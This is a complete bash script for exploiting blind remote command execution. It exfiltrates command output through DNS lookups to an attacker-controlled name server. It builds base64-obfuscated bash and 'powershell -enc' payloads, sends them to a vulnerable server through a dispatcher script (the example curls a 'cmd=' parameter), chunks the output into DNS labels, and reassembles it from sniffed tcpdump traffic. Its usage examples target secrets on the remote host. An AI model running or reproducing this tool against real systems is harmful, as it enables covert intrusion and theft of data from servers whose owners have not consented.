#!/bin/bash

nlabels=4
label_size=30
debug=0
mode=0 #bash or powershell
strict_label_charset=1
outfile=/dev/stdout
oci=0


########FUNCTION DEFINITIONS#############
function usage {
    cat <<-!
Usage:
    $0 [OPTION]... -- CMD
    
    -h HOST             The host with an NS record pointing to a name server under our control. This can be a random name in case we control the name server through the DNS_TRIGGER and direct connections to that NS are allowed by the target server (unlikely)
    -d DNS_TRIGGER      The command that will trigger DNS requests on the external server
    -x DISPATCHER       Path to the script that will trigger the command execution on the server. 
                        The script should take as argument a command and have it executed on the target server
                        example: curl https://vulnerable_server --data-urlencode "cmd=${1}"
    -n NLABELS=4        The number of labels to use for the data exfiltration. data1.data2...dataN.uid.yourdns.ns
    -s LABEL_SIZE=30    The size of each label. len(data1)
    -o FILE=stdout      The file where the command output will be stored
    -w                  Switch to powershell mode. Defaults to bash
    -r                  No encoding of +/= characters before issuing dns requests
    -v                  Verbose mode
    
    Examples:
    stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x dispatcher.sh -- 'ls -lha|grep secret'
    cat dispatcher.sh: 
        \$@
    
    $0 -h youdns.ns -w -d "Resolve-DnsName" -x dispatcher.sh -- 'gci | % {\$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
    cat dispatcher.sh
        curl https://vulnerable_server --data-urlencode "cmd=\${1}"
!
}

function debug_print {
    [[ $debug -ne 0 ]] && echo "$@"
}

function b64 {
    local target_enc="UTF-8"
    
    [[ $mode -eq 1 ]] && target_enc=UTF-16LE
    if [[ $1 == -d ]]; then
        base64 -d
    else
        iconv -f UTF-8 -t "$target_enc" | base64 -w0
    fi
}

function listen_for {
    local data dns_req_host
    local postfix="$1"
    
    while read -u "$dns_data_fd" -r line || [[ -n $line ]]; do
        if [[ $line == *"${postfix}"* ]]; then
            dns_req_host=$(echo "$line"|grep -Eo "[^ ]+${postfix}")
            data=${dns_req_host%${postfix}}
            break
        fi
    done
    printf %s $data
}

function strict_translator {
    local data sed_arg
        
    #we expect one line of data
    IFS= read -r data
    if [[ $strict_label_charset -eq 1 ]]; then
        [[ -z $1 ]] && data=$(echo "$data"|sed "s_+_-1_g; s_/_-2_g; s_=_-3_g")
        [[ ! -z $1 ]] && data=$(echo "$data"|sed "s_-1_+_g; s_-2_/_g; s_-3_=_g")
    fi
    printf %s "$data"  
}

function assign {
    [[ $1 == bash && $mode == 0 ]] && {
        declare -g "$2"="$3"
    }
    
    [[ $1 == powershell && $mode == 1 ]] && {
        declare -g "$2"="$3"
    }
}

#######END OF FUNCTIONS#########

######ARGUMENT PROCESSING############

[[ $# -eq 0 ]] && {
    usage
    exit
}

while [[ $# -gt 0 ]]; do
    key="$1"

    case $key in
        -h)
        dns_host="$2"
        shift
        shift
        ;;
        -d)
        dns_trigger="$2"
        shift
        shift
        ;;
        -n)
        nlabels="$2"
        shift
        shift
        ;;
        -s)
        label_size="$2"
        shift
        shift
        ;;
        -x)
        dispatcher="$2"
        shift
        shift
        ;;
        -o)
        outfile="$2"
        shift
        shift
        ;;
        -w) #powershell
        mode=1 
        shift
        ;;
        -r|--relaxed)
        strict_label_charset=0
        shift
        ;;
        -v|--debug)
        debug=1
        shift
        ;;
        --help)
        usage
        exit
        shift
        ;;
        --)
        shift
        break
        ;;
        *) 
        echo "invalid option $1"
        exit
        ;;
    esac
done

cmd="$*"

mandatory_args=(dns_host dns_trigger dispatcher cmd)
for arg in "${mandatory_args[@]}"; do
    [[ -z ${!arg} ]] && echo "Missing arg: $arg" && exit
done

YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'
[[ $mode -eq 0 ]] && printf "${YELLOW}******BASH******${NC}\n"
[[ $mode -eq 1 ]] && printf "${YELLOW}******POWERSHELL*******${NC}\n"
printf "Dispatcher: ${YELLOW}%s${NC}\n" "$dispatcher"
[[ ! -x $dispatcher ]] && printf "${RED}Dispatcher file is not executable${NC}\n"
printf "Base DNS Host: ${YELLOW}%s${NC}\n" "$dns_host"
printf "DNS Trigger Command: ${YELLOW}%s${NC}\n" "$dns_trigger"
printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\n"
printf "Listening to DNS traffic with: ${YELLOW}%s${NC}\n" "${get_dns_traffic_cmd[*]}"
[[ $strict_label_charset -ne 1 && $mode -eq 1 ]] && printf "${RED}Windows+Strict Label Charset OFF=?${NC}\n"
[[ -t 0 ]] && printf "${RED}NS DNS data are expected through stdin, check usage examples${NC}\n"

##########END OF ARGUMENT PROCESSING#############

##########bash definitions#######
assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
[[ $oci -eq 1 ]] && {
    assign bash outer_cmd_template 'bash -c $@|base64${IFS}-d|bash . echo %CMD_B64%'
}

assign bash innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%%UNIQUE_DNS_HOST%'

assign bash user_cmd_template "\`(${cmd})|base64 -w0|{ read -r c;printf \${c:%INDEX%:%COUNT%}; }\`"
[[ $strict_label_charset -eq 1 ]] && {
    assign bash user_cmd_template "\`(${cmd})|base64 -w0|{ read -r c;printf \${c:%INDEX%:%COUNT%}; }|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'\`"
}

assign bash user_cmd_out_len "\`(${cmd})|base64 -w0|wc -c\`"
assign bash user_cmd_sep .

###########powershell definitions########

assign powershell outer_cmd_template "powershell -enc %CMD_B64%"

assign powershell innerdns_cmd_template '%dns_trigger% $("{0}.{1}{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")'
#assign powershell innerdns_cmd_template '(1..5)|%{%dns_trigger% $("{0}.{1}{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")}'

assign powershell user_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).Substring(%INDEX%,%COUNT%)"
[[ $strict_label_charset -eq 1 ]] && {
    assign powershell user_cmd_template "([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).Substring(%INDEX%,%COUNT%) -replace '\+','-1' -replace '/','-2' -replace '=','-3')"
}

assign powershell user_cmd_out_len "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).length"
assign powershell user_cmd_sep '+"."+'

#######end of definitions###########

#definitions sanity check
vars=(outer_cmd_template innerdns_cmd_template user_cmd_template user_cmd_out_len user_cmd_sep)
for var in "${vars[@]}"; do
    [[ -z ${!var} ]] && echo "Undeclared var: $var" && exit
done

#####MAIN###########
exec {dns_data_fd}<&0
exec 0</dev/tty

run_uid=$(date +%s) #used to identify the traffic generated by the current session
unique_dns_host="${run_uid}.${dns_host}"

#extracting command output length
echo -e "\nTrying to execute: \"${cmd}\""
pre_innerdns_cmd=${innerdns_cmd_template}
pre_innerdns_cmd=${pre_innerdns_cmd/'%dns_trigger%'/$dns_trigger}
pre_innerdns_cmd=${pre_innerdns_cmd/'%UNIQUE_DNS_HOST%'/$unique_dns_host}
pre_innerdns_cmd=${pre_innerdns_cmd/'%STAGE_ID%'/len}
innerdns_cmd=${pre_innerdns_cmd/'%USER_CMD%'/${user_cmd_out_len}}
debug_print "innerdns_cmd=$innerdns_cmd"

cmd_b64=$(echo "$innerdns_cmd"|b64)
debug_print "cmd_b64=$cmd_b64"

outer_cmd=${outer_cmd_template/'%CMD_B64%'/$cmd_b64}
debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"

"$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
#(sleep 2;"$dispatcher" "$outer_cmd" >/dev/null 2>&1)&
cmd_out_len=$(listen_for ".len${unique_dns_host}")

[[ -z $cmd_out_len ]] && {
    echo "Failed to get the output length, verify that we can listen to DNS traffic"
    exit
}

echo "The command output length is: $cmd_out_len"

#extracting the command output
pre_innerdns_cmd=${innerdns_cmd_template}
pre_innerdns_cmd=${pre_innerdns_cmd/'%dns_trigger%'/$dns_trigger}
pre_innerdns_cmd=${pre_innerdns_cmd/'%UNIQUE_DNS_HOST%'/$unique_dns_host}
cmd_out=""
for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size}));do
    innerdns_cmd=${pre_innerdns_cmd/'%STAGE_ID%'/iter${index_base}}
    for index in `seq $((index_base)) ${label_size} $((index_base+(nlabels-1)*label_size))`;do
        [[ $index -ge $cmd_out_len ]] && break
        count=$(((cmd_out_len-index)>label_size?label_size:cmd_out_len-index))
        user_cmd=${user_cmd_template/'%INDEX%'/${index}}
        user_cmd=${user_cmd/'%COUNT%'/${count}}
        innerdns_cmd=${innerdns_cmd/'%USER_CMD%'/${user_cmd}${user_cmd_sep}'%USER_CMD%'}
    done
    innerdns_cmd=${innerdns_cmd/${user_cmd_sep}'%USER_CMD%'}
    debug_print "$innerdns_cmd"
    
    cmd_b64=$(echo "$innerdns_cmd"|b64)
    debug_print "cmd_b64=$cmd_b64"

    outer_cmd=${outer_cmd_template/'%CMD_B64%'/$cmd_b64}
    debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
    
    "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
    data=$(listen_for ".iter${index_base}${unique_dns_host}")
    debug_print "data for index_base=${index_base}: $data"
    
    cmd_out="${cmd_out}${data}"
    debug_print "$cmd_out"
    printf "\r[$index_base/$cmd_out_len]"
done && echo

cmd_out=$(echo $cmd_out | tr -d .)

echo "$cmd_out" | strict_translator -d | b64 -d > "$outfile"

setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)